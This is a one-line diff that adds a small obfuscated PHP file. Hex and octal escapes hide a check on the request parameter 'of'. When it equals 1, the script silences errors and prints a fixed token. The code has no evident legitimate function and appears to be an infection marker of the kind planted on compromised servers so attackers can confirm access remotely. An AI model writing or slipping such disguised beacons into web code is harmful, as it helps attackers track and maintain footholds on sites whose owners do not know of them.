@@ -1,0 +1,1 @@
+<?php  error_reporting(0); $aRZE = array("\x5f\107\x45\x54"); (${$aRZE[0]}["\157\x66"] == 1) && die("XgCwf6P6KEfvny7kQ+0wyAdhzzw4/H7UkvupRNlyZhwYGbVO5z6sx2hlkk5yqPQN");  ?>
